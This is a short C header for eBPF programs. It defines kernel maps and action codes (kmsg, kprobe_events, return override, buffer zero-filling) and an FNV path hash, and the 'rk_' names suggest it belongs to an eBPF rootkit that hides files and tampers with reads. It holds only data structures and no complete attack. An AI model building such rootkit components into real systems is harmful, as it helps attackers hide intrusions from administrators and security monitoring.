#ifndef __COMMON_H
#define __COMMON_H

#include <linux/kconfig.h>
#include <linux/ptrace.h>
#include <linux/types.h>
#include <linux/version.h>

#include "include/bpf.h"
#include "include/bpf_helpers.h"

struct bpf_map_def SEC("maps/read_ret_progs") read_ret_progs = {
    .type = BPF_MAP_TYPE_PROG_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(u32),
    .max_entries = 11,
};

#define MAX_SEGMENT_LENGTH 32

#define FILL_WITH_ZERO_PROG 10

enum
{
    KMSG_ACTION = 1,
    KPROBE_EVENTS_ACTION,
    OVERRIDE_RETURN_0_ACTION,
};

struct rk_file_t
{
    u64 fd;
    u64 action;
};

struct bpf_map_def SEC("maps/rk_files") rk_files = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(u64),
    .value_size = sizeof(struct rk_file_t),
    .max_entries = 128,
    .pinning = 0,
    .namespace = "",
};

struct rk_fd_key_t
{
    u64 fd;
    u32 pid;
    u32 padding;
};

struct rk_fd_attr_t
{
    u64 action;

    void *read_buf;
    u64 read_size;
};

struct bpf_map_def SEC("maps/rk_fd_attrs") rk_fd_attrs = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(struct rk_fd_key_t),
    .value_size = sizeof(struct rk_fd_attr_t),
    .max_entries = 128,
    .pinning = 0,
    .namespace = "",
};

struct rk_path_key_t
{
    u64 hash;
    u64 pos;
};

struct rk_path_attr_t
{
    u64 fs_hash;
    u64 action;
};

struct bpf_map_def SEC("maps/rk_path_keys") rk_path_keys = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(struct rk_path_key_t),
    .value_size = sizeof(struct rk_path_attr_t),
    .max_entries = 128,
    .pinning = 0,
    .namespace = "",
};

// Fowler/Noll/Vo hash
#define FNV_BASIS ((__u64)14695981039346656037U)
#define FNV_PRIME ((__u64)1099511628211U)

#define __update_hash(key, data) \
    *key ^= (__u64)(data);       \
    *key *= FNV_PRIME;

void __attribute__((always_inline)) update_hash_byte(__u64 *key, __u8 byte)
{
    __update_hash(key, byte);
}

void __attribute__((always_inline)) update_hash_str(__u64 *hash, const char *str)
{
#pragma unroll
    for (int i = 0; i != MAX_SEGMENT_LENGTH; i++)
    {
        if (str[i] == '\0')
        {
            break;
        }
        update_hash_byte(hash, str[i]);
    }
}

#endif